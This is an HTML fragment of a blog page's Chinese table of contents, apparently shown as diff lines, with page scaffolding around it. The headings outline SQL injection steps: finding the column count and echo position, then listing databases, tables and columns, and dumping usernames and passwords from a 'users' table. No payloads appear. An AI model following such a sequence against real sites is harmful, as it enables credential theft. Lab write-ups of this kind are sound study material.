href="#%E5%88%A4%E6%96%AD%E7%BD%91%E7%AB%99%E6%9F%A5%E8%AF%A2%E7%9A%84%E5%AD%97%E6%AE%B5%E6%95%B0-1"><span class="toc-number">2.</span> <span class="toc-text">判断网站查询的字段数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E7%BD%91%E7%AB%99%E7%9A%84%E5%9B%9E%E6%98%BE%E4%BD%8D%E7%BD%AE-1"><span class="toc-number">3.</span> <span class="toc-text">判断网站的回显位置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%BD%91%E7%AB%99%E5%BD%93%E5%89%8D%E6%89%80%E5%9C%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%BA%93%E5%90%8D-1"><span class="toc-number">4.</span> <span class="toc-text">获取网站当前所在数据库的库名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93security%E7%9A%84%E5%85%A8%E9%83%A8%E8%A1%A8%E5%90%8D-1"><span class="toc-number">5.</span> <span class="toc-text">获取数据库security的全部表名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96users%E8%A1%A8%E7%9A%84%E5%85%A8%E9%83%A8%E5%AD%97%E6%AE%B5%E5%90%8D-1"><span class="toc-number">6.</span> <span class="toc-text">获取users表的全部字段名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96users%E8%A1%A8id%E3%80%81username%E5%92%8Cpassword%E5%AD%97%E6%AE%B5%E7%9A%84%E5%85%A8%E9%83%A8%E5%80%BC%E3%80%82-1"><span class="toc-number">7.</span> <span class="toc-text">获取users表id、username和password字段的全部值。</span></a></li></ol>
+                </div>
+            </button>
+            
+
+            
+
+            <a href="#nexmoe-content" class="backtop toc-link" aria-label="Back To Top" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
+        </div>
+    </div>
+</div></div><div id="nexmoe-footer"><!--!--></div><div id="nexmoe-search-space"><div class="search-container"><div class="search-header"><div class="search-input-container"><input class="search-input" type="text" placeholder="搜索" onInput="sinput();"></div><a class="search-close" onclick="sclose();">×</a></div><div class="search-body"></div></div></div><div><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2058306854838448" crossorigin="anonymous"></script>
+</div></body></html>
